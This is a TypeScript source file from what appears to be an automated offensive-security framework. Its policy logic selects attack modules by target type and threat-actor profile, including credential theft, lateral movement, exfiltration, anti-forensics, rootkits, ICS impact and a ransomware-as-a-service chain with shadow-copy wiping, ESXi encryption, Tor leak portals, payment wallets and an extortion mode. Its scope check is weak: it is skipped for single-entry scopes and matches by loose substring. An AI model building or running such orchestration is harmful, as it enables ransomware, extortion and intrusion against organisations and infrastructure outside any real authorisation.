/**
 * @module engagement_policy
 * Server-side persona-aware engagement rules (no LLM).
 */
import type { AresPhase } from "./mcp_efficiency.ts"
import type { CredentialGraph } from "./credential_graph.ts"
import type { FlowObjective, FlowProfile, TargetPersona } from "./target_flow.ts"
import { modulesForPhase, skipAdAutoChain } from "./target_flow.ts"
import { modulesForSector, prioritizeModulesForSector } from "./institutional_hints.ts"
import { modulesForVertical } from "./ot_verticals.ts"
import { loadAptPlaybookMappings, resolveAptProfile } from "./apt_intel_feed.ts"
import { evaluateRoeGate } from "./roe_attestation.ts"
import { applyExtortionMode, extortionModeFromEnv, extortionModeForGroup } from "./extortion_mode.ts"

const NON_AD_PERSONAS: TargetPersona[] = [
  "web_app", "cloud_saas", "container_k8s", "ai_agent_surface",
  "ot_plc", "ot_scada_plant", "iot_device", "telecom_carrier",
  "physical_usb", "wireless_perimeter",
]

const AD_IDENTITY_MODULES = [
  "cred_access_auto", "ares_kerberos_advanced", "ares_lateral_scale", "ares_auto_chain",
]

const CLOUD_RECON_MODULES = ["cloud_enum", "ares_cloud_native", "multi_cloud_asm"]
const WEB_EXPLOIT_MODULES = ["app_security_engine", "strix_web", "http_state_fuzz", "exploit_adapter"]
const SUPPLY_CHAIN_MODULES = [
  "supply_chain_exec", "ares_supply_chain_implant", "cicd_audit", "lockfile_scan", "supply_chain_audit", "chaindrop_oidc",
]
const AD_POST_EX_MODULES = ["campaign_loop", "autonomous_pivot", "segment_tunnel", "collection_engine"]
const AD_APT_MODULES = ["tier1_orchestrator", "apt_playbook", "c2_autonomous", "c2_dwell_ops", "c2_dwell_scheduler"]
const OT_SUPPLEMENT_MODULES = ["profinet_l2", "ot_segment_infer", "firmware_audit"]
const TELECOM_SUPPLEMENT_MODULES = ["ares_ss7_exploit", "telecom_audit", "ares_satellite_c2"]

/** Meta MCP entrypoints — not phase-executable modules. */
const META_BRIDGE = new Set([
  "ares_dispatch", "ares_phase", "ares_engagement_slice", "ares_engagement_continue", "ares_autopilot",
])

/** Full bridge catalog by phase — ensures slice→phase_runner reaches all wired engines. */
const BRIDGE_RECON_CATALOG = [
  "counter_intel", "attack_navigator", "runtime_capability", "auto_research", "hybrid_ad_audit",
  "oauth_audit", "webmail_audit", "adcs_audit", "lolbins_audit", "ebpf_audit", "uefi_audit",
  "mobile_audit", "firmware_audit", "opsec_review", "institutional_recon", "cred_dump",
  "multi_cloud_asm", "ot_segment_infer", "profinet_l2", "supply_chain_audit", "lockfile_scan", "cicd_audit",
  "ai_agent_audit", "edge_audit", "esxi_audit",
]

const BRIDGE_EXPLOIT_CATALOG = [
  "pivot_tunnel", "implant_build", "http_state_fuzz", "exploit_adapter", "exploit_synthesis",
  "persistence_install", "identity_chain", "identity_playbooks", "cred_access_auto",
  "ares_ad_exploit", "ares_evasion_engine", "ares_network_exploit", "strix_web", "app_security_engine",
  "ares_kerberos_advanced", "ares_lateral_scale", "ares_ai_ml_attacks", "ares_ss7_exploit",
  "supply_chain_exec", "ares_supply_chain_implant", "iot_scada", "ics_impact_proof",
]

const BRIDGE_POST_EX_CATALOG = [
  "proof_export", "collection_engine", "engagement_memory", "impact_assess", "ares_exfil",
  "campaign_loop", "autonomous_pivot", "segment_tunnel", "privesc_chains", "raas_campaign",
  "ares_auto_chain", "ares_anti_forensics_advanced", "ares_persistence_advanced", "edr_feedback_loop",
]

const BRIDGE_APT_CATALOG = [
  "tier1_orchestrator", "tier1_validation", "tier1_depth", "apt_playbook", "dry_run_simulator",
  "c2_autonomous", "c2_dwell_ops", "c2_dwell_scheduler", "c2_rotation",
  "ares_orchestrator", "ares_zero_day_fuzzer", "ares_fileless_implant", "ares_firmware_implant",
  "ares_hypervisor_rootkit", "ares_airgap_bridge", "ares_rat_builder", "ares_hardware_implant",
  "ares_satellite_c2", "ares_cloud_native", "esxi_lab_encrypt",
  "raas_vss_wipe", "raas_leak_catalog", "raas_esxi_encrypt", "raas_smb_spread", "raas_gpo_spread",
  "raas_payment", "raas_exfil_upload", "raas_gpo_deploy", "raas_tor_portal", "raas_esxi_deploy",
  "raas_wallet_create", "raas_wallet_install_deps", "raas_wallet_balance", "raas_wallet_list", "raas_wallet_wipe",
]

function bridgeCatalogForPhase(phase: AresPhase): string[] {
  switch (phase) {
    case "recon": return BRIDGE_RECON_CATALOG
    case "exploit": return BRIDGE_EXPLOIT_CATALOG
    case "post_ex": return BRIDGE_POST_EX_CATALOG
    case "apt": return BRIDGE_APT_CATALOG
    default: return []
  }
}

export interface PolicyDecision {
  allowed: boolean
  blockers: string[]
  skipPhases: AresPhase[]
  prioritizeModules: string[]
  skipModules: string[]
}

function inScope(target: string, scope: string[]): boolean {
  if (!scope.length) return true
  const t = target.replace(/\/.*$/, "").toLowerCase()
  return scope.some((s) => {
    const anchor = s.toLowerCase()
    return t === anchor || t.endsWith(`.${anchor}`) || anchor.includes(t) || t.includes(anchor)
  })
}

/** Merge APT playbook modules when aptHint resolves to a known actor profile. */
function prioritizeAptModules(aptHint: string | undefined, prioritizeModules: string[]): void {
  if (!aptHint?.trim()) return
  const profile = resolveAptProfile(aptHint)
  if (!profile) return
  const mappings = loadAptPlaybookMappings()
  const playbook = mappings[profile.id]
  const merged = [...(playbook?.modules ?? []), ...profile.tools]
  for (const m of merged.reverse()) prioritizeModules.unshift(m)
}

/** Evaluate engagement policy for target persona + cred state. */
export function evaluateEngagementPolicy(opts: {
  profile: FlowProfile
  objective: FlowObjective
  live: boolean
  credGraph?: CredentialGraph
  phase?: AresPhase
  aptHint?: string
}): PolicyDecision {
  const { profile, objective, live, credGraph, phase, aptHint } = opts
  const blockers: string[] = []
  const skipPhases: AresPhase[] = []
  const prioritizeModules: string[] = []
  const skipModules: string[] = []

  if (live && profile.scope.length > 1 && !inScope(profile.target, profile.scope)) {
    blockers.push(`target ${profile.target} outside declared scope: ${profile.scope.join(", ")}`)
  }

  const roe = evaluateRoeGate({ live, scope: profile.scope })
  if (!roe.allowed) blockers.push(...roe.blockers)

  if (profile.persona === "ot_plc" || profile.persona === "iot_device") {
    skipPhases.push("identity")
    skipModules.push(...AD_IDENTITY_MODULES)
    prioritizeModules.push("iot_scada", "ics_impact_proof", "ot_scan", ...OT_SUPPLEMENT_MODULES)
  }

  if (profile.persona === "ot_scada_plant") {
    skipPhases.push("identity")
    prioritizeModules.unshift("ot_batch_scan", "iot_scada", "telecom_audit", ...OT_SUPPLEMENT_MODULES)
  }

  if (profile.persona === "hybrid_it_ot" || objective === "hybrid_it_ot") {
    prioritizeModules.unshift("hybrid_pivot", "ot_batch_scan", "segment_tunnel", "autonomous_pivot")
  }

  if (NON_AD_PERSONAS.includes(profile.persona) || objective === "ai_agent") {
    skipPhases.push("identity")
    skipModules.push(...AD_IDENTITY_MODULES)
  }

  if (skipAdAutoChain(profile, objective)) {
    skipModules.push("ares_auto_chain", "cred_access_auto", "ares_kerberos_advanced", "ares_lateral_scale")
  }

  if (profile.persona === "enterprise_ad" || objective === "identity_first") {
    prioritizeModules.push(
      "cred_access_auto", "ares_kerberos_advanced", "net_device_audit",
      "helpdesk_social_auto", "oauth_consent_audit", "rmm_audit", "idp_audit",
    )
    if (phase === "post_ex" || !phase) for (const m of AD_POST_EX_MODULES) prioritizeModules.push(m)
    if (phase === "apt" || !phase) for (const m of AD_APT_MODULES) prioritizeModules.push(m)
    if (phase === "identity" || !phase) {
      prioritizeModules.push("identity_chain", "identity_playbooks", "hybrid_ad_audit", "evilginx_lab")
    }
    if (phase === "exploit" || !phase) {
      prioritizeModules.push("exploit_adapter", "exploit_synthesis", "ares_ad_exploit", "citrix_audit")
    }
  }

  if (
    profile.persona === "cloud_saas"
    || profile.persona === "container_k8s"
    || profile.persona === "esxi_hypervisor"
    || objective === "cloud_ransom"
  ) {
    for (const m of CLOUD_RECON_MODULES) prioritizeModules.push(m)
  }

  if (profile.persona === "web_app" || (profile.isWebLikely && objective === "ai_agent")) {
    for (const m of WEB_EXPLOIT_MODULES) prioritizeModules.push(m)
    prioritizeModules.push("ai_agent_audit", "tier1_validation")
  }

  if (profile.persona === "telecom_carrier" || objective === "telecom") {
    for (const m of TELECOM_SUPPLEMENT_MODULES) prioritizeModules.unshift(m)
  }

  if (
    objective === "proximity_physical"
    || profile.persona === "physical_usb"
    || profile.persona === "wireless_perimeter"
    || profile.isUsbLikely
    || profile.isWirelessLikely
    || profile.isBleLikely
  ) {
    skipPhases.push("identity")
    skipModules.push(...AD_IDENTITY_MODULES)
    if (profile.isUsbLikely || profile.persona === "physical_usb") {
      prioritizeModules.unshift("usb_audit", "ares_hardware_implant")
    }
    if (profile.isWirelessLikely || profile.persona === "wireless_perimeter") {
      prioritizeModules.unshift("wifi_audit")
    }
    if (profile.isBleLikely) {
      prioritizeModules.push("ble_audit")
    }
  }

  if (
    (objective === "hybrid_it_ot" || profile.persona === "hybrid_it_ot")
    && credGraph
    && credGraph.inferOtSubnets().length > 0
  ) {
    prioritizeModules.push("ot_batch_scan", "hybrid_pivot")
  }

  if (profile.kind === "cidr" || profile.target.includes("/")) {
    prioritizeModules.unshift("ot_batch_scan")
  }

  if (objective === "ot_ics") {
    prioritizeModules.push("ics_impact_proof", "iot_scada", ...OT_SUPPLEMENT_MODULES)
  }

  if (objective === "supply_chain" || profile.persona === "supply_chain_repo") {
    skipPhases.push("identity")
    skipModules.push(...AD_IDENTITY_MODULES)
    for (const m of SUPPLY_CHAIN_MODULES) prioritizeModules.unshift(m)
  }

  if (profile.persona === "container_k8s") {
    prioritizeModules.push("cicd_audit", "ares_cloud_native", "multi_cloud_asm")
  }

  if (objective === "ransomware_impact" || objective === "cloud_ransom") {
    prioritizeModules.push("raas_campaign", "esxi_audit", "ares_hypervisor_rootkit", "citrix_audit", "rmm_audit")
  }

  prioritizeAptModules(aptHint, prioritizeModules)

  const playbook = aptHint ? loadAptPlaybookMappings()[resolveAptProfile(aptHint)?.id ?? ""] : undefined
  if (objective === "cloud_ransom" && playbook?.cloudNative) {
    skipModules.push("lolbins_audit", "cred_dump", "postex_harvest")
  }

  const profileId = resolveAptProfile(aptHint ?? "")?.id
  const extortion = profileId ? extortionModeForGroup(profileId) : extortionModeFromEnv()
  if (extortion.enabled) {
    const filtered = applyExtortionMode(prioritizeModules, extortion)
    prioritizeModules.length = 0
    prioritizeModules.push(...filtered)
    skipModules.push("raas_vss_wipe", "raas_esxi_encrypt", "raas_smb_spread")
  }

  if (profile.institutionalSector) {
    for (const m of prioritizeModulesForSector(profile.institutionalSector)) {
      prioritizeModules.unshift(m)
    }
    const sectorMods = modulesForSector(profile.institutionalSector)
    for (const m of sectorMods.slice(0, 2)) {
      if (!prioritizeModules.includes(m)) prioritizeModules.unshift(m)
    }
    if (profile.institutionalSector === "government") {
      prioritizeModules.unshift("citrix_audit")
    }
    if (profile.institutionalSector === "legal" || profile.institutionalSector === "corporate_office") {
      prioritizeModules.unshift("app_security_engine")
    }
    if (profile.institutionalSector === "telecom_office") {
      prioritizeModules.unshift("telecom_audit")
    }
    if (profile.institutionalSector === "critical_infra") {
      prioritizeModules.unshift("ot_batch_scan", "institutional_recon")
      if (profile.otVertical) {
        for (const m of modulesForVertical(profile.otVertical)) {
          if (!prioritizeModules.includes(m)) prioritizeModules.unshift(m)
        }
      }
      if (profile.kind === "cidr" || profile.target.includes("/")) {
        prioritizeModules.unshift("hybrid_pivot")
      }
    }
  }

  if (!live) {
    blockers.push("dry-run: live probes skipped — set OURMINE_LIVE=1 or pass --live")
  }

  const allowed = blockers.filter((b) => !b.startsWith("dry-run")).length === 0

  return { allowed, blockers, skipPhases, prioritizeModules, skipModules }
}

/** Persona/objective supplemental bridge modules not in base phase lists. */
export function supplementalModulesForPhase(
  phase: AresPhase,
  profile: FlowProfile,
  objective: FlowObjective,
): string[] {
  const out: string[] = []

  if (objective === "supply_chain" || profile.persona === "supply_chain_repo") {
    if (phase === "recon") out.push(...SUPPLY_CHAIN_MODULES)
    if (phase === "exploit") out.push("ares_supply_chain_implant", "supply_chain_exec", "exploit_adapter")
    if (phase === "post_ex") out.push("campaign_loop", "collection_engine")
  }

  if (profile.persona === "enterprise_ad" || objective === "identity_first") {
    if (phase === "identity") out.push(
      "identity_chain", "identity_playbooks", "hybrid_ad_audit", "oauth_audit", "oauth_consent_audit",
      "adcs_audit", "helpdesk_social_auto", "idp_audit",
    )
    if (phase === "exploit") out.push("citrix_audit", "rmm_audit", "evilginx_lab")
    if (phase === "exploit") out.push("exploit_adapter", "exploit_synthesis", "http_state_fuzz", "ares_ad_exploit")
    if (phase === "post_ex") out.push(...AD_POST_EX_MODULES, "ares_auto_chain")
    if (phase === "apt") out.push(...AD_APT_MODULES, "ares_orchestrator")
  }

  if (profile.persona === "cloud_saas" || profile.persona === "container_k8s" || objective === "cloud_ransom") {
    if (phase === "recon") out.push("multi_cloud_asm", "cloud_enum", "ares_cloud_native", "edge_audit", "oauth_consent_audit", "idp_audit")
    if (phase === "exploit") out.push("ares_cloud_native", "ares_ai_ml_attacks", "cloud_token")
    if (phase === "post_ex") out.push("collection_engine", "ares_exfil", "impact_assess")
    if (phase === "apt") out.push("ares_orchestrator", "ares_cloud_native")
  }

  if (profile.persona === "web_app" || profile.persona === "ai_agent_surface" || objective === "ai_agent") {
    if (phase === "recon") out.push("ai_agent_audit", "http_state_fuzz")
    if (phase === "exploit") out.push("strix_web", "app_security_engine", "exploit_adapter", "tier1_validation")
    if (phase === "post_ex") out.push("impact_assess", "ares_exfil", "collection_engine")
  }

  if (profile.persona === "telecom_carrier" || objective === "telecom") {
    if (phase === "recon") out.push("telecom_audit", "runtime_capability")
    if (phase === "exploit") out.push("ares_ss7_exploit")
    if (phase === "apt") out.push("ares_ss7_exploit", "ares_satellite_c2", "ares_orchestrator")
  }

  if (profile.isOtLikely || objective === "ot_ics" || objective === "hybrid_it_ot") {
    if (phase === "recon") out.push(...OT_SUPPLEMENT_MODULES)
    if (phase === "exploit") out.push("iot_scada", "ics_impact_proof")
    if (phase === "post_ex") out.push("ics_impact_proof", "impact_assess")
    if (phase === "apt") out.push("ares_firmware_implant", "ares_airgap_bridge")
  }

  if (objective === "ransomware_impact") {
    if (phase === "recon") out.push("citrix_audit", "edge_audit", "rmm_audit")
    if (phase === "post_ex") out.push("raas_campaign", "esxi_audit", "impact_assess", "rmm_audit")
    if (phase === "apt") out.push("ares_hypervisor_rootkit", "ares_orchestrator")
  }

  if (objective === "proximity_physical" || profile.persona === "physical_usb" || profile.persona === "wireless_perimeter") {
    if (phase === "apt") out.push("ares_hardware_implant", "ares_airgap_bridge", "campaign_loop")
  }

  // Merge phase bridge catalog — persona filters avoid obvious mismatches
  const catalog = bridgeCatalogForPhase(phase).filter((m) => !META_BRIDGE.has(m))
  if (phase === "apt") {
    out.push(...catalog)
  } else if (phase === "post_ex" && (profile.persona === "enterprise_ad" || objective === "identity_first" || objective === "ransomware_impact")) {
    out.push(...catalog)
  } else if (phase === "recon" && profile.persona !== "web_app") {
    out.push(...catalog.filter((m) => !m.startsWith("raas_")))
  } else if (phase === "exploit") {
    out.push(...catalog.filter((m) => {
      if (profile.persona === "web_app" || profile.persona === "ai_agent_surface") {
        return !m.includes("kerberos") && !m.includes("lateral") && m !== "ares_ad_exploit"
      }
      if (NON_AD_PERSONAS.includes(profile.persona) && !profile.isOtLikely) {
        return !["ares_kerberos_advanced", "ares_lateral_scale", "cred_access_auto", "ares_ad_exploit"].includes(m)
      }
      return true
    }))
  }

  return [...new Set(out)]
}

/** Apply policy to module list for a phase. */
export function applyPolicyToModules(
  phase: AresPhase,
  profile: FlowProfile,
  objective: FlowObjective,
  credGraph?: CredentialGraph,
  live = true,
  aptHint?: string,
): string[] {
  const policy = evaluateEngagementPolicy({ profile, objective, live, credGraph, phase, aptHint })
  if (policy.skipPhases.includes(phase)) return []

  let mods = [
    ...modulesForPhase(phase, profile, objective),
    ...supplementalModulesForPhase(phase, profile, objective),
  ]
  mods = mods.filter((m) => !policy.skipModules.includes(m))

  const injectIfMissing = [
    "ot_batch_scan", "usb_audit", "wifi_audit", "ble_audit",
    "campaign_loop", "supply_chain_exec", "multi_cloud_asm",
    "ares_ss7_exploit", "profinet_l2", "ot_segment_infer", "hybrid_pivot",
    "rmm_audit", "citrix_audit", "helpdesk_social_auto", "oauth_consent_audit",
    "app_security_engine", "institutional_recon", "telecom_audit",
  ]

  for (const pri of policy.prioritizeModules) {
    if (mods.includes(pri)) {
      mods = [pri, ...mods.filter((m) => m !== pri)]
    } else if (injectIfMissing.includes(pri)) {
      mods.unshift(pri)
    }
  }

  return [...new Set(mods)]
}

/** Persona-aware module list for a phase (alias for applyPolicyToModules). */
export function getModulesForPersona(
  phase: AresPhase,
  profile: FlowProfile,
  objective: FlowObjective,
  credGraph?: CredentialGraph,
  live = true,
  aptHint?: string,
): string[] {
  return applyPolicyToModules(phase, profile, objective, credGraph, live, aptHint)
}

export default { evaluateEngagementPolicy, applyPolicyToModules, getModulesForPersona, supplementalModulesForPhase }
